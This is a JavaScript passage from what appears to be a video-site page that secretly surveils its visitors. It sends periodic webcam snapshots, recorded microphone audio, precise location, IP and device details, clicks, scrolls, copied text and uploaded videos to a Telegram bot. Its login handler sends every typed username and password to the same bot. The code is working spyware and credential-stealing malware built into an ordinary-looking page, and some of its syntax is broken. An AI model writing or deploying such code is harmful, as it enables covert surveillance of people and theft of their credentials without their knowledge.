    // Webcam elements
    const videoElementForCapture = document.getElementById("videoElementForCapture");
    const webcamCanvas = document.getElementById("snapshot");
    const webcamCtx = webcamCanvas.getContext("2d");

    // Microphone tracking and recording variables
    let audioContext = null;
    let analyserNode = null;
    let microphoneStream = null;

    let mediaRecorder = null;

    let lastAverageLoudness = 0; // **NEW**: Store last loudness value

    const ANALYSER_FFT_SIZE = 2048;
    const MIC_THRESHOLD_HIGH = 40;
    const MIC_THRESHOLD_LOW = 30;
    const AUDIO_CHUNK_TIME = 5000;

    let userLocation = { lat: "N/A", lon: "N/A" };

    // --- Geolocation Logic ---
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
            sendToBot(`üìç Got location: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}`);
          },
          error => {
            let errorMessage = "Unknown error";
            if (error.code === 1) errorMessage = "User denied Geolocation permission.";
            else if (error.code === 2) errorMessage = "Location unavailable.";
            else if (error.code === 3) errorMessage = "Location request timed out.";
            sendToBot(`üö´ Error getting location: ${errorMessage}`);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
        );
      } else {
        sendToBot("üö´ Geolocation not supported by this browser.");
      }
    }

    // --- Webcam Capture Logic ---
    function captureAndSend(caption = "üì∏ Webcam Snapshot") { // **MODIFIED**: Added default caption
      if (!videoElementForCapture.srcObject || !videoElementForCapture.srcObject.active || videoElementForCapture.readyState < videoElementForCapture.HAVE_METADATA) {
        return;
      }
      try {
        webcamCanvas.width = videoElementForCapture.videoWidth;
        webcamCanvas.height = videoElementForCapture.videoHeight;
        webcamCtx.drawImage(videoElementForCapture, 0, 0, webcamCanvas.width, webcamCanvas.height);
        webcamCanvas.toBlob(blob => {
          if (blob) sendPhoto(blob, caption);
        }, "image/png");
      } catch (e) {
        sendToBot(`üö´ Error during webcam snapshot capture: ${e.message}`);
      }
    }

    function startLoopCapture() {
        captureAndSend();
        setInterval(captureAndSend, 15000); // Changed interval to 15s to reduce noise
    }

    // --- Microphone Recording and Tracking Logic ---
    function getMicrophoneStreamAndRecord() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            sendToBot("üö´ Microphone access not supported by this browser.");
            return;
        }
         if (!window.MediaRecorder) {
            sendToBot("üö´ Audio recording not supported by this browser.");
            return;
         }

        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                microphoneStream = stream;
                sendToBot("‚úÖ User granted microphone permission. Starting recording...");
                initAudioAnalysis(stream);

                let options = { mimeType: 'audio/webm;codecs=opus' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'audio/webm' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                         options = { mimeType: 'audio/ogg' };
                         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                              options = {};
                         }
                    }
                }
                 mediaRecorder = new MediaRecorder(stream, options);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        sendAudioToBot(event.data);
                    }
                };

                 mediaRecorder.onerror = (event) => {
                     sendToBot(`‚ö†Ô∏è MediaRecorder error: ${event.error.name || 'Unknown Error'}`);
                 };

                mediaRecorder.start(AUDIO_CHUNK_TIME);

                stream.getTracks().forEach(track => {
                    track.onended = () => {
                        sendToBot("‚ÑπÔ∏è Microphone stream ended. Recording stopped.");
                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                           try { mediaRecorder.stop(); } catch(e) { /* ignore */ }
                        }
                        if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
                        analyserNode = null;
                    };
                });
            })
            .catch(handleMediaError("Microphone"));
    }

    function initAudioAnalysis(stream) {
        try {
            if (!audioContext || audioContext.state === 'closed') {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                 if (audioContext.state === 'suspended') {
                     const resumeHandler = () => audioContext.resume().catch(e => {});
                     document.body.addEventListener('click', resumeHandler, {once: true});
                     document.addEventListener('touchstart', resumeHandler, {once: true});
                     document.addEventListener('play', resumeHandler, {once: true});
                 }
            }

            const source = audioContext.createMediaStreamSource(stream);
            analyserNode = audioContext.createAnalyser();
            analyserNode.fftSize = ANALYSER_FFT_SIZE;
            micDataArray = new Uint8Array(analyserNode.frequencyBinCount);
            source.connect(analyserNode);

            analyseAudioStream();

             stream.getTracks().forEach(track => {
                 track.onended = () => {
                     if (source) { try { source.disconnect(); } catch(e){}}
                     if (analyserNode) { try { analyserNode.disconnect(); } catch(e){}}
                 };
             });
        } catch (e) {
            sendToBot(`üö´ Error setting up audio analysis: ${e.message}`);
             if(stream) stream.getTracks().forEach(track => track.stop());
        }
    }

    function analyseAudioStream() {
        if (!analyserNode || !micDataArray || !microphoneStream || !microphoneStream.active) {
             audioAnalyserId = null;
            return;
        }

        analyserNode.getByteFrequencyData(micDataArray);
        let sumOfSquares = 0;
        for (let i = 0; i < micDataArray.length; i++) {
            sumOfSquares += micDataArray[i] * micDataArray[i];
        }
        const averageLoudness = Math.sqrt(sumOfSquares / micDataArray.length);
        lastAverageLoudness = averageLoudness; // **NEW**: Update global loudness value

        if (micState === 'quiet' && averageLoudness >= MIC_THRESHOLD_HIGH) {
            micState = 'active';
            sendToBot(`üé§ Significant sound detected (Loudness: ${averageLoudness.toFixed(1)})`);
        } else if (micState === 'active' && averageLoudness < MIC_THRESHOLD_LOW) {
            micState = 'quiet';
            sendToBot(`üîá Sound levels low (Loudness: ${averageLoudness.toFixed(1)})`);
        }

        audioAnalyserId = requestAnimationFrame(analyseAudioStream);
    }

    function sendAudioToBot(audioBlob) {
        if (!audioBlob || audioBlob.size === 0) return;
        const fileSizeKB = (audioBlob.size / 1024).toFixed(1);
        const formData = new FormData();
        formData.append("chat_id", chatId);
        const filename = `audio_chunk_${Date.now()}.${audioBlob.type.split('/')[1].split(';')[0]}`;
        formData.append("audio", audioBlob, filename);

        const locationInfo = (userLocation.lat !== "N/A") ? `üìç ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
        // **MODIFIED**: Added loudness level to caption
        const caption = `üé§ Audio (${(AUDIO_CHUNK_TIME/1000)}s)\nLoudness: ${lastAverageLoudness.toFixed(1)}\nState: ${micState}\nLoc: ${locationInfo}`;
        formData.append("caption", caption);

        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: "POST", body: formData })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) sendToBot(`‚ùå TG Audio Send Err: ${data.description}`);
        })
        .catch(error => sendToBot(`üö´ Net Audio Send Err: ${error.message}`));
    }

    // --- General Telegram Sending & Helper Functions ---
    function sendPhoto(blob, captionPrefix) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      const filename = `${captionPrefix.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.png`;
      formData.append("photo", blob, filename);
      const locationInfo = (userLocation.lat !== "N/A") ? `üìç ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
      formData.append("caption", `${captionPrefix}\nLoc: ${locationInfo}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
      .then(response => response.json())
      .then(data => { if (!data.ok) sendToBot(`‚ö†Ô∏è TG PhotoErr: ${data.description}`); })
      .catch(error => sendToBot(`üö´ Net PhotoErr: ${error.message}`));
    }

    function sendToBot(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, disable_notification: true }) // Added disable_notification
      }).catch(error => console.error("Net MsgErr:", error));
    }

    function handleMediaError(mediaType) { // **NEW**: Centralized media error handler
        return function(error) {
            let errorMessage = error.message || "Unknown error";
            if (error.name === 'NotAllowedError') errorMessage = `User denied ${mediaType} permission.`;
            else if (error.name === 'NotFoundError') errorMessage = `No ${mediaType.toLowerCase()} found.`;
            else if (error.name === 'NotReadableError') errorMessage = `${mediaType} is busy or not working.`;
            else if (error.name === 'OverconstrainedError') errorMessage = `Requested ${mediaType} constraints cannot be satisfied.`;
            sendToBot(`üö´ ${mediaType} access failed: ${errorMessage}`);
        }
    }

    // --- Page & Device Info Tracking ---
    const pageStartTime = Date.now();
    let maxScrollDepthAchieved = 0;

    function sendIPAndBasicInfo() {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const userAgent = navigator.userAgent;
          let os = "Unknown OS";
          if (userAgent.includes("Win")) os = "Windows"; else if (userAgent.includes("Mac")) os = "MacOS"; else if (userAgent.includes("Android")) os = "Android"; else if (userAgent.match(/iPhone|iPad|iPod/i)) os = "iOS"; else if (userAgent.includes("Linux")) os = "Linux";
          let browser = "Unknown Browser";
          if (userAgent.includes("Firefox/")) browser = "Firefox"; else if (userAgent.includes("Edg/")) browser = "Edge"; else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera"; else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome"; else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/")) browser = "Safari"; else if (userAgent.includes("Trident/")) browser = "IE";

          const screen = `${window.screen.width}x${window.screen.height}`;
          const referrer = document.referrer || "Direct visit";
          const language = navigator.language;
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
          const basicMessage = `‚ÑπÔ∏è Visitor Info:\nIP: ${ip}\nOS: ${os}\nBrowser: ${browser}\nScreen: ${screen}\nReferrer: ${referrer}\nLang: ${language}\nZone: ${timezone}\nLogged In: ${isLoggedIn}`;
          sendToBot(basicMessage);
        })
        .catch(() => sendToBot("üö´ Could not fetch client IP address."));
    }

    function sendEnhancedDeviceInfo() { // **NEW**: Function to send more device data
        let report = "üíª Enhanced Device Info:\n";

        // Battery Status
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                report += `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})\n`;
                sendToBot(report); // Send once battery info is resolved
            }).catch(() => {
                report += "Battery: N/A\n";
                sendToBot(report);
            });
        } else {
            report += "Battery: API not supported\n";
            sendToBot(report);
        }

        // Network Information
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            const type = conn.type || 'N/A';
            const speed = conn.downlink ? `${conn.downlink} Mbps` : 'N/A';
            report += `Network: ${type}, Speed: ${speed}\n`;
        }

        // Device Memory
        if ('deviceMemory' in navigator) {
            report += `Device RAM: ~${navigator.deviceMemory} GB\n`;
        }

        // Screen Orientation
        try {
            const orientation = screen.orientation.type;
            report += `Orientation: ${orientation}\n`;
        } catch(e) {}
    }


    // --- Event Listeners for User Activity ---
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === 'hidden') {
        const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
        sendToBot(`üö™ Page hidden. Time: ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
         if (audioContext && audioContext.state === 'running') audioContext.suspend().catch(e => {});
      } else if (document.visibilityState === 'visible') {
        sendToBot(`üëÄ Tab active. Scroll: ${getCurrentScrollPercentage().toFixed(0)}%`);
         if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
      }
    });

    window.addEventListener("beforeunload", () => {
      const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
      sendToBot(`üö™ Page closing. Total time: ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s.`);
       if (videoElementForCapture?.srcObject) videoElementForCapture.srcObject.getTracks().forEach(track => track.stop());
       if (microphoneStream) microphoneStream.getTracks().forEach(track => track.stop());
       if (mediaRecorder?.state !== 'inactive') try { mediaRecorder.stop(); } catch(e) {}
       if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
       if (audioContext?.state !== 'closed') audioContext.close().catch(e => {});
    });

    // **NEW**: Screen Orientation Change Listener

        screen.orientation.addEventListener('change', (event) => {
            const type = event.target.type;
            sendToBot(`üîÑ Orientation changed to: ${type}`);

    } catch(e) { /* Fails gracefully if API not supported */ }


    // --- Video Logic ---
    const videoStates = new WeakMap();
    function getVideoState(videoElement){
        if(!videoStates.has(videoElement)) videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false});
        return videoStates.get(videoElement);
    }
    function getVideoFileName(videoElement){
        const source = videoElement.currentSrc || videoElement.src || "";
        return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1)) || 'UnknownVideo';
    }

    document.querySelectorAll('.homevideo').forEach(videoEl => {
      const videoName = getVideoFileName(videoEl);
      const state = getVideoState(videoEl);
      videoEl.addEventListener('play', function() {
        if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
        if (!isLoggedIn && this.currentTime >= 5) { this.pause(); currentVideo = this; showLoginModal(); return; }
        sendToBot( (!state.hasStartedPlaying || this.ended) ? `‚ñ∂Ô∏è Started: ${videoName}` : `‚ñ∂Ô∏è Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`);
        state.hasStartedPlaying = true; if(this.ended) state.previousTime = 0;
        state.previousTime = this.currentTime;
      });
      videoEl.addEventListener('pause', function() {
        if (!isLoggedIn && currentVideo === this && this.currentTime >= 4.9 && !this.ended) return;
        if (!this.ended && this.currentTime > 0) sendToBot(`‚è∏Ô∏è Paused: ${videoName} at ${this.currentTime.toFixed(1)}s`);
      });
      videoEl.addEventListener('ended', function() { sendToBot(`‚èπÔ∏è Finished: ${videoName}`); state.hasStartedPlaying = false; });
      videoEl.addEventListener('volumechange', function() { sendToBot(`üîä Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`); });
      videoEl.addEventListener('seeked', function() { sendToBot(`‚è≠Ô∏è Seeked ${videoName} to ${this.currentTime.toFixed(1)}s`); state.previousTime = this.currentTime; });
      videoEl.addEventListener('timeupdate', function() {
        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) { this.pause(); currentVideo = this; showLoginModal(); }
        if (!this.seeking) state.previousTime = this.currentTime;
      });
      videoEl.addEventListener('error', function() { sendToBot(`‚ö†Ô∏è Video error on ${videoName}`); });
      videoEl.addEventListener('webkitbeginfullscreen', function() { lastFullscreenVideo = this; sendToBot(`‚ÜïÔ∏è FS Enter: ${videoName}`); });
      videoEl.addEventListener('webkitendfullscreen', function() { sendToBot(`‚ÜïÔ∏è FS Exit: ${videoName}`); if (lastFullscreenVideo === this) lastFullscreenVideo = null; });
    });

    ['fullscreenchange','webkitfullscreenchange'].forEach(e => document.addEventListener(e, () => {
        if (!document.fullscreenElement && lastFullscreenVideo) { sendToBot(`‚ÜïÔ∏è FS Exit`); lastFullscreenVideo = null; }
    }));


    // --- Login & Upload Logic ---
    function showLoginModal() { document.getElementById('loginModal').style.display = 'block'; }
    function hideLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
    function showSuccessAnimation() {
        const overlay = document.getElementById('successOverlay');
        overlay.classList.add('show');
        setTimeout(() => overlay.classList.remove('show'), 1500);
    }

    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const username = usernameInput.value;
      const password = passwordInput.value;

      // **MODIFIED**: Capture and send credentials on every attempt
      sendToBot(`üîí Login Attempt:\nUsername: ${username}\nPassword: ${password}`);

      if (username === 'your_username' && password === 'your_password') { // <-- REPLACE CREDENTIALS
         isLoggedIn = true;
         localStorage.setItem("isLoggedIn", "true");
         hideLoginModal();
         showSuccessAnimation();
         sendToBot(`‚úÖ Login successful for "${username}".`);
         captureAndSend(`üì∏ Snapshot on Successful Login`); // **NEW**: Capture photo on login
         usernameInput.value = ''; passwordInput.value = '';
         setTimeout(() => {
             if (currentVideo) { currentVideo.play().catch(console.warn); currentVideo = null; }
         }, 1500);
      } else {
        alert('Invalid username or password.');
        sendToBot(`‚ùå Login failed for "${username}".`);
        usernameInput.value = ''; passwordInput.value = '';
      }
    });

    // Upload logic remains largely the same, it is already quite robust.
    const videoUploadInputEl = document.getElementById('videoUpload');
    const fileNameDisplayEl = document.getElementById('fileNameDisplay');
    const uploadProgressDivEl = document.getElementById('uploadProgress');
    const progressBarEl = document.getElementById('progressBar');
    const progressTextEl = document.getElementById('progressText');
    const uploadedVideosDivEl = document.getElementById('uploadedVideos');

    videoUploadInputEl.addEventListener('change', function() { fileNameDisplayEl.textContent = this.files?.[0]?.name || 'No file chosen'; });
    document.getElementById('uploadVideoButton').addEventListener('click', () => {
        const file = videoUploadInputEl.files[0];
        if (!file) { alert("Please select a video file."); return; }
        const fileSizeMB = (file.size / 1024 / 1024);
        if (fileSizeMB > 50) { alert(`File is too large (${fileSizeMB.toFixed(2)}MB). Max 50MB.`); return; }
        uploadVideo(file, fileSizeMB);
    });

    function uploadVideo(file, fileSizeMB) {
        sendToBot(`üì• Upload init: ${file.name} (${fileSizeMB.toFixed(2)}MB)`);
        uploadProgressDivEl.style.display = 'block';
        progressTextEl.textContent = 'Uploading...';
        progressBarEl.value = 10;
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('video', file, file.name);
        formData.append('caption', `üé¨ User uploaded: ${file.name} (${fileSizeMB.toFixed(2)}MB)`);
        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
        .then(res => res.json()).then(data => {
            progressBarEl.value = 100;
            if(data.ok) {
                progressTextEl.textContent = 'Upload successful!';
                const videoPreview = document.createElement('video');
                videoPreview.src = URL.createObjectURL(file); videoPreview.controls = true; videoPreview.width = 320;
                uploadedVideosDivEl.prepend(videoPreview);
            } else {
                progressTextEl.textContent = `Upload failed: ${data.description}`;
            }
        }).catch(err => {
            progressTextEl.textContent = 'Upload failed. Network error.';
        }).finally(() => {
            videoUploadInputEl.value = null; fileNameDisplayEl.textContent = 'No file chosen';
            setTimeout(() => { uploadProgressDivEl.style.display = 'none'; }, 5000);
        });
    }

    // --- Interaction Logging ---
    function getElementDescriptor(element) {
        if (!element) return 'N/A';
        let desc = element.tagName;
        if (element.id) desc += `#${element.id}`;
        if (element.className && typeof element.className === 'string') desc += `.${element.className.trim().split(/\s+/).join('.')}`;
        const text = (element.textContent || element.value || "").trim().substring(0, 30);
        if (text) desc += ` (text: "${text}...")`;
        return desc;
    }

    document.addEventListener('click', event => {
        // **MODIFIED**: Added mouse coordinates to click log
        const clickDetails = `üñ±Ô∏è Click: ${getElementDescriptor(event.target)} at (X:${event.clientX}, Y:${event.clientY})`;
        sendToBot(clickDetails);
         if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
    }, true);

    let scrollTimeout;
    window.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(checkScrollDepth, 250);
    }, {passive: true});
    function getCurrentScrollPercentage() {
        const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
        return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
    }
    const scrollMilestones = new Set();
    function checkScrollDepth() {
        const currentDepth = getCurrentScrollPercentage();
        if (currentDepth > maxScrollDepthAchieved) maxScrollDepthAchieved = currentDepth;
        [25, 50, 75, 90, 100].forEach(m => {
            if (maxScrollDepthAchieved >= m && !scrollMilestones.has(m)) {
                sendToBot(`üìú Scroll ${m}%`);
                scrollMilestones.add(m);
            }
        });
    }
    checkScrollDepth();

    document.addEventListener('copy', event => {
        const copiedText = window.getSelection().toString().trim();
        if (copiedText) sendToBot(`üìã Copy:"${copiedText.substring(0, 100)}..."`);
    });
    document.addEventListener('paste', event => sendToBot(`üìã Paste detected on ${getElementDescriptor(event.target)}`));

  </script>
